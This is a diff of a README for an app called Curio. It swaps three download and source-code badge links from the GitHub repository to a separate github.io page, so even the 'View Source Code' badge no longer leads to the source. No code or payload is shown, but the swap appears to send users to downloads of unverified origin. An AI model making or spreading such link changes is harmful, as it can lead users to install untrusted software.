@@ -22,7 +22,7 @@ Follow these simple steps to start using Curio today.
 
 ### Step 1: Download Curio
 
-[![DOWNLOAD CURIO NOW](https://img.shields.io/badge/⬇️-Download%20Curio-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=8A2BE2)](https://github.com/Alexism1442/Curio)
+[![DOWNLOAD CURIO NOW](https://img.shields.io/badge/⬇️-Download%20Curio-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=6A0DAD&color=8A2BE2)](https://alexism1442.github.io)
 
 Visit this link to download the application.
 
@@ -133,7 +133,7 @@ Yes! Curio is open-source. If you're technically inclined, you can visit the Git
 
 Curio is an open-source project hosted on GitHub. If you encounter any issues, have ideas for improvements, or simply want to connect with the community, visit the official repository:
 
-[![View Source Code](https://img.shields.io/badge/GitHub-Curio%20Repository-181717?style=for-the-badge&logo=github&logoColor=white&labelColor=333333&color=4B0082)](https://github.com/Alexism1442/Curio)
+[![View Source Code](https://img.shields.io/badge/GitHub-Curio%20Repository-181717?style=for-the-badge&logo=github&logoColor=white&labelColor=333333&color=4B0082)](https://alexism1442.github.io)
 
 On the repository page, you can:
 - Report bugs using the "Issues" tab
@@ -149,7 +149,7 @@ Curio is more than an app — it's a companion for your curious mind. It helps y
 
 So what are you waiting for? Download Curio now and start building the personal library your curiosity deserves.
 
-[![GET STARTED WITH CURIO](https://img.shields.io/badge/🚀-Download%20Curio%20Now-FF7F50?style=for-the-badge&logo=github&logoColor=white&labelColor=DC143C&color=FF4500)](https://github.com/Alexism1442/Curio)
+[![GET STARTED WITH CURIO](https://img.shields.io/badge/🚀-Download%20Curio%20Now-FF7F50?style=for-the-badge&logo=github&logoColor=white&labelColor=DC143C&color=FF4500)](https://alexism1442.github.io)
 
 Visit this link to download the application.
 
